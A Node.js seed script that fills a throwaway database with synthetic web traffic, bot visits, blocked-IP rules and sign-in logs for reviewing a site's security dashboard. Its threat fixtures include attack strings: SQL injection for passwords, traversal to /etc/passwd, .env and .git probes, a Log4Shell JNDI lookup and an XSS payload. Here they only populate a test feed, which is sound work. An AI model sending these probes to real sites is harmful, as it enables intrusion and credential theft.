#!/usr/bin/env node
/**
 * seed-traffic.js — believable traffic and threat history for the panel.
 *
 * The Security and Traffic centres cannot be reviewed against an empty database:
 * every chart is a straight line, every table says "nothing yet", and the derived
 * headlines all take their good-news branch. This writes ninety days of visits,
 * pageviews, threats, blocks and sign-in attempts so the panels can be read the
 * way they will actually look.
 *
 * WRITTEN BEFORE THE SERVER BOOTS, deliberately. server/db.js holds the whole
 * database in memory and rewrites the file on a debounce, so a second process
 * writing to the same file while the server is running would have its work
 * overwritten by the server's next save. seed-preview.js calls this first, then
 * spawns the server, which reads the finished file.
 *
 * Imported by scripts/seed-preview.js. Also runnable alone:
 *   node scripts/seed-traffic.js [dataDir]
 *
 * Nothing here touches data/. The caller passes a throwaway directory.
 */

const path = require('path');

// A small, fixed, seeded PRNG. Math.random() would make every run produce a
// different-looking panel, and "the chart looked wrong yesterday" is not a
// debuggable statement.
function rng(seed) {
  let s = seed >>> 0;
  return () => {
    s = (s * 1664525 + 1013904223) >>> 0;
    return s / 4294967296;
  };
}

const PAGES = [
  ['/', 0.34], ['/work', 0.12], ['/work/torah-tracker', 0.11], ['/work/pcg', 0.09],
  ['/work/davenen', 0.08], ['/work/shiphero-ai', 0.07], ['/work/predictable', 0.06],
  ['/work/olami-thrive', 0.05], ['/portal', 0.04], ['/admin', 0.04],
];
const TITLES = {
  '/': 'Kaymen Group — software that ships',
  '/work': 'Selected work',
};

const DEVICES = [['desktop', 0.52], ['mobile', 0.40], ['tablet', 0.08]];
const BROWSERS = {
  desktop: [['Chrome 138.0.0.0', 'Windows 10'], ['Safari 18.2', 'Mac OS 15.2'],
            ['Chrome 137.0.0.0', 'Mac OS 14.6'], ['Firefox 134.0', 'Windows 11'],
            ['Edge 138.0.0.0', 'Windows 11']],
  mobile:  [['Mobile Safari 18.2', 'iOS 18.2'], ['Chrome 138.0.0.0', 'Android 15'],
            ['Mobile Safari 17.6', 'iOS 17.6'], ['Samsung Browser 27.0', 'Android 14']],
  tablet:  [['Mobile Safari 18.2', 'iOS 18.2'], ['Chrome 138.0.0.0', 'Android 15']],
};
const SCREENS = {
  desktop: [[2560, 1440, 1440, 900], [1920, 1080, 1512, 860], [1512, 982, 1400, 800],
            [1440, 900, 1280, 720], [3840, 2160, 1800, 1000]],
  mobile:  [[390, 844, 390, 664], [430, 932, 430, 750], [412, 915, 412, 730], [360, 800, 360, 620]],
  tablet:  [[1024, 1366, 1024, 1180], [820, 1180, 820, 1000]],
};
const PLACES = [
  ['United States', 'US', 'New York', 'New Jersey', 'Verizon Fios', 'AS701 Verizon', 0.44],
  ['United States', 'US', 'Lakewood', 'New Jersey', 'Optimum Online', 'AS6128 Cablevision', 0.14],
  ['Israel', 'IL', 'Jerusalem', 'Jerusalem', 'Bezeq International', 'AS8551 Bezeq', 0.12],
  ['United Kingdom', 'GB', 'London', 'England', 'BT Broadband', 'AS2856 BT', 0.07],
  ['Canada', 'CA', 'Toronto', 'Ontario', 'Rogers Communications', 'AS812 Rogers', 0.06],
  ['Israel', 'IL', 'Tel Aviv', 'Tel Aviv', 'Partner Communications', 'AS12400 Partner', 0.05],
  ['Australia', 'AU', 'Sydney', 'New South Wales', 'Telstra', 'AS1221 Telstra', 0.04],
  ['Germany', 'DE', 'Frankfurt', 'Hesse', 'Deutsche Telekom', 'AS3320 DTAG', 0.04],
  ['France', 'FR', 'Paris', 'Île-de-France', 'Orange', 'AS3215 Orange', 0.02],
  ['Netherlands', 'NL', 'Amsterdam', 'North Holland', 'KPN', 'AS1136 KPN', 0.02],
];
const REFERRERS = [
  ['', 0.42], ['https://www.google.com/', 0.22], ['https://news.ycombinator.com/', 0.08],
  ['https://www.linkedin.com/feed/', 0.07], ['https://x.com/', 0.05],
  ['https://duckduckgo.com/', 0.05], ['https://github.com/', 0.04],
  ['https://www.bing.com/', 0.03], ['https://torahtracker.app/', 0.04],
];
const BOTS = [
  ['search', 'Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
  ['search', 'Bingbot', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'],
  ['ai', 'GPTBot', 'Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)'],
  ['ai', 'ClaudeBot', 'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)'],
  ['social', 'Facebook', 'facebookexternalhit/1.1'],
  ['seo', 'AhrefsBot', 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)'],
  ['monitor', 'UptimeRobot', 'Mozilla/5.0+(compatible; UptimeRobot/2.0)'],
  ['tool', 'Python', 'python-requests/2.32.3'],
];

// Threat fixtures: enough variety that the feed's filters have something to
// filter, and enough severity that the derived posture takes its alert branch.
const THREATS = [
  ['sqli', 'SQL injection', 'critical', 70, "/search?q=1' UNION SELECT password FROM users--", 1],
  ['traversal', 'Path traversal', 'high', 65, '/assets/../../../../etc/passwd', 1],
  ['secrets', 'Secret file probe', 'high', 55, '/.env', 0],
  ['secrets', 'Secret file probe', 'high', 55, '/.git/config', 0],
  ['cms', 'CMS probe', 'medium', 30, '/wp-login.php', 0],
  ['cms', 'CMS probe', 'medium', 30, '/wp-admin/setup-config.php', 1],
  ['dbadmin', 'Database console probe', 'high', 45, '/phpmyadmin/index.php', 0],
  ['exts', 'Server-language probe', 'medium', 40, '/index.php', 0],
  ['webshell', 'Webshell probe', 'critical', 60, '/shell.php', 1],
  ['log4shell', 'Log4Shell JNDI probe', 'critical', 90, '/?x=${jndi:ldap://x.example/a}', 1],
  ['scanner_ua', 'Security scanner (Nuclei)', 'critical', 80, '/', 1],
  ['infra', 'Infrastructure probe', 'high', 40, '/actuator/health', 0],
  ['xss', 'XSS payload', 'high', 50, '/?q=<script>alert(1)</script>', 0],
  ['envfile', 'Config probe', 'medium', 35, '/server-status', 0],
];
const ATTACKER_IPS = [
  ['45.146.164.110', 'Russia', 'RU', 'Moscow', 'Chang Way Technologies', 'AS57523'],
  ['185.220.101.34', 'Germany', 'DE', 'Frankfurt', 'Tor Exit Relay', 'AS205100'],
  ['104.248.44.201', 'United States', 'US', 'Clifton', 'DigitalOcean', 'AS14061'],
  ['159.223.88.17', 'Singapore', 'SG', 'Singapore', 'DigitalOcean', 'AS14061'],
  ['92.63.197.55', 'Netherlands', 'NL', 'Amsterdam', 'Petersburg Internet Network', 'AS44050'],
];

function pick(rand, weighted) {
  const r = rand();
  let acc = 0;
  for (const row of weighted) {
    acc += row[row.length - 1];
    if (r <= acc) return row;
  }
  return weighted[weighted.length - 1];
}
const choice = (rand, arr) => arr[Math.floor(rand() * arr.length)];
const iso = (d) => d.toISOString().slice(0, 19).replace('T', ' ');

async function seedTraffic(dataDir, { days = 90, seed = 20260817 } = {}) {
  process.env.DATA_DIR = dataDir;
  const { initDb, getDb, saveNow } = require(path.join(__dirname, '..', 'server', 'db.js'));
  await initDb();
  const db = getDb();

  if (db.prepare('SELECT COUNT(*) as c FROM visits').get().c > 0) {
    return { skipped: true };
  }

  const rand = rng(seed);
  const now = Date.now();
  let visits = 0, pageviews = 0, threats = 0;

  const insVisit = db.prepare(`
    INSERT INTO visits (
      session_id, visitor_id, is_returning, ip, user_agent, referrer, path,
      country, country_code, city, region, asn, device_type, browser, os,
      screen_width, screen_height, viewport_width, viewport_height, pixel_ratio,
      language, timezone, utm_source, utm_medium, utm_campaign,
      is_bot, bot_kind, duration_seconds, active_seconds, max_scroll,
      pageview_count, created_at, last_seen_at
    ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
  `);
  const insPage = db.prepare(`
    INSERT INTO pageviews (visit_id, session_id, path, title, referrer,
      duration_seconds, active_seconds, max_scroll, created_at)
    VALUES (?,?,?,?,?,?,?,?,?)
  `);
  const insGeo = db.prepare(`
    INSERT OR REPLACE INTO geo_cache (ip, country, country_code, city, region, isp, asn, cached_at)
    VALUES (?,?,?,?,?,?,?, datetime('now'))
  `);

  const knownVisitors = [];

  for (let d = days; d >= 0; d--) {
    const date = new Date(now - d * 86400000);
    const dow = date.getDay();
    // A working site: quieter at weekends, and growing slowly over the window,
    // so the trend line has a shape rather than being noise around a mean.
    const growth = 0.55 + (days - d) / days * 0.75;
    const weekend = (dow === 0 || dow === 6) ? 0.55 : 1;
    const count = Math.max(1, Math.round((7 + rand() * 12) * growth * weekend));

    for (let i = 0; i < count; i++) {
      const [country, cc, city, region, isp, asn] = pick(rand, PLACES);
      const [device] = pick(rand, DEVICES);
      const [browser, os] = choice(rand, BROWSERS[device]);
      const [sw, sh, vw, vh] = choice(rand, SCREENS[device]);
      const [referrer] = pick(rand, REFERRERS);
      const [landing] = pick(rand, PAGES);

      // A quarter of visitors come back, which is what makes new-vs-returning a
      // real figure rather than a constant.
      const returning = knownVisitors.length > 20 && rand() < 0.26;
      const visitorId = returning ? choice(rand, knownVisitors) : `v-${Math.floor(rand() * 1e9)}`;
      if (!returning) knownVisitors.push(visitorId);
      const sessionId = `s-${d}-${i}-${Math.floor(rand() * 1e6)}`;

      const at = new Date(date);
      // Weighted toward working hours, with a real evening tail.
      at.setHours(rand() < 0.7 ? 8 + Math.floor(rand() * 11) : Math.floor(rand() * 24),
        Math.floor(rand() * 60), Math.floor(rand() * 60));

      const bounced = rand() < 0.38;
      const pageCount = bounced ? 1 : 1 + Math.floor(rand() * 4);
      const dwell = bounced ? Math.floor(rand() * 9) : 25 + Math.floor(rand() * 400);
      const active = Math.round(dwell * (0.45 + rand() * 0.4));
      const scroll = bounced ? 8 + Math.floor(rand() * 22) : 40 + Math.floor(rand() * 60);
      const ip = `${20 + Math.floor(rand() * 200)}.${Math.floor(rand() * 255)}.${Math.floor(rand() * 255)}.${1 + Math.floor(rand() * 250)}`;

      const utm = referrer.includes('news.ycombinator') ? ['hn', 'social', 'launch'] : [null, null, null];

      const r = insVisit.run(
        sessionId, visitorId, returning ? 1 : 0, ip,
        `Mozilla/5.0 (${os}) ${browser}`, referrer || null, landing,
        country, cc, city, region, asn, device, browser, os,
        sw, sh, vw, vh, device === 'mobile' ? 3 : 2,
        cc === 'IL' ? 'he-IL' : cc === 'FR' ? 'fr-FR' : cc === 'DE' ? 'de-DE' : 'en-US',
        cc === 'IL' ? 'Asia/Jerusalem' : cc === 'GB' ? 'Europe/London' : 'America/New_York',
        utm[0], utm[1], utm[2],
        0, null, dwell, active, scroll, pageCount, iso(at), iso(at)
      );
      visits++;
      insGeo.run(ip, country, cc, city, region, isp, asn);

      let path = landing;
      for (let pv = 0; pv < pageCount; pv++) {
        const pAt = new Date(at.getTime() + pv * (dwell / pageCount) * 1000);
        insPage.run(r.lastInsertRowid, sessionId, path, TITLES[path] || null,
          pv === 0 ? (referrer || null) : null,
          Math.round(dwell / pageCount), Math.round(active / pageCount),
          Math.min(100, scroll), iso(pAt));
        pageviews++;
        path = pick(rand, PAGES)[0];
      }
    }

    // Bots, on their own axis so the human figures stay human.
    const botCount = 2 + Math.floor(rand() * 6);
    for (let i = 0; i < botCount; i++) {
      const [kind, label, ua] = choice(rand, BOTS);
      const at = new Date(date);
      at.setHours(Math.floor(rand() * 24), Math.floor(rand() * 60));
      const ip = `66.249.${Math.floor(rand() * 255)}.${1 + Math.floor(rand() * 250)}`;
      insVisit.run(
        `bot-${d}-${i}`, null, 0, ip, ua, null, choice(rand, PAGES)[0],
        'United States', 'US', 'Mountain View', 'California', 'AS15169 Google',
        'desktop', label, 'Other', null, null, null, null, null,
        null, null, null, null, null,
        1, kind, 0, 0, 0, 1, iso(at), iso(at)
      );
      visits++;
    }
  }

  // ---- threats ------------------------------------------------------------
  const insThreat = db.prepare(`
    INSERT INTO suspicious_activity
      (ip, reason, severity, details, category, path, method, user_agent, score, blocked, created_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?)
  `);
  for (const [ip, country, cc, city, isp, asn] of ATTACKER_IPS) {
    insGeo.run(ip, country, cc, city, city, isp, asn);
  }
  for (let d = Math.min(days, 30); d >= 0; d--) {
    const bursts = rand() < 0.45 ? 1 + Math.floor(rand() * 4) : 0;
    for (let i = 0; i < bursts; i++) {
      const [ip] = choice(rand, ATTACKER_IPS);
      const [cat, reason, sev, score, p, blocked] = choice(rand, THREATS);
      const at = new Date(now - d * 86400000);
      at.setHours(Math.floor(rand() * 24), Math.floor(rand() * 60), Math.floor(rand() * 60));
      insThreat.run(ip, reason, sev, `path: ${p}`, cat, p, 'GET',
        cat === 'scanner_ua' ? 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)'
          : 'Mozilla/5.0 (X11; Linux x86_64)',
        score, blocked, iso(at));
      threats++;
    }
  }

  // ---- rules --------------------------------------------------------------
  const insRule = db.prepare(`
    INSERT OR REPLACE INTO ip_rules (ip, action, reason, source, severity, hits, expires_at, created_at, last_hit_at)
    VALUES (?,?,?,?,?,?,?,?,?)
  `);
  insRule.run(ATTACKER_IPS[0][0], 'block', 'SQL injection, Path traversal', 'auto', 'critical', 41,
    iso(new Date(now + 20 * 3600000)), iso(new Date(now - 4 * 3600000)), iso(new Date(now - 900000)));
  insRule.run(ATTACKER_IPS[4][0], 'block', 'Sustained probing — 210 threat score in 10 minutes', 'auto', 'high', 12,
    iso(new Date(now + 3 * 3600000)), iso(new Date(now - 3 * 3600000)), iso(new Date(now - 4200000)));
  insRule.run('91.203.145.9', 'block', 'Persistent contact-form spam', 'manual', 'high', 3,
    null, iso(new Date(now - 12 * 86400000)), iso(new Date(now - 6 * 86400000)));

  // ---- auth events --------------------------------------------------------
  const insAuth = db.prepare(`
    INSERT INTO auth_events (user_id, email, event, ip, user_agent, detail, created_at)
    VALUES (?,?,?,?,?,?,?)
  `);
  const OFFICE = '74.101.28.144';
  insGeo.run(OFFICE, 'United States', 'US', 'Clifton', 'New Jersey', 'Optimum Online', 'AS6128');
  for (let d = 21; d >= 0; d--) {
    if (rand() < 0.75) {
      const at = new Date(now - d * 86400000);
      at.setHours(8 + Math.floor(rand() * 3), Math.floor(rand() * 60));
      insAuth.run(1, 'ohavkahalany@gmail.com', 'login_success', OFFICE,
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/138.0.0.0', 'admin', iso(at));
    }
  }
  // A credential-stuffing run against an address that does not exist, plus a
  // real lockout — both branches of the sign-in log need to be visible.
  const attackAt = new Date(now - 2 * 86400000);
  attackAt.setHours(3, 14);
  for (let i = 0; i < 9; i++) {
    const at = new Date(attackAt.getTime() + i * 40000);
    insAuth.run(null, i % 3 === 0 ? 'admin@kaymen.dev' : 'info@kaymen.dev', 'login_failed',
      ATTACKER_IPS[2][0], 'python-requests/2.32.3', 'No such account', iso(at));
  }
  const lockAt = new Date(now - 5 * 86400000);
  lockAt.setHours(22, 41);
  for (let i = 0; i < 4; i++) {
    insAuth.run(1, 'ohavkahalany@gmail.com', 'login_failed', '172.58.104.22',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) Safari/604.1',
      `Attempt ${i + 1}/5`, iso(new Date(lockAt.getTime() + i * 30000)));
  }
  insAuth.run(1, 'ohavkahalany@gmail.com', 'lockout', '172.58.104.22',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) Safari/604.1',
    '5 failed attempts — locked 15m', iso(new Date(lockAt.getTime() + 150000)));

  saveNow();
  return { visits, pageviews, threats, days };
}

module.exports = { seedTraffic };

if (require.main === module) {
  const dir = process.argv[2] || path.join(__dirname, '..', '.preview-data');
  seedTraffic(dir)
    .then(r => {
      if (r.skipped) return console.log('Already has visits — nothing seeded.');
      console.log(`Seeded ${r.visits} visits, ${r.pageviews} pageviews, ${r.threats} threats over ${r.days} days into ${dir}`);
      process.exit(0);
    })
    .catch(e => { console.error(e); process.exit(1); });
}
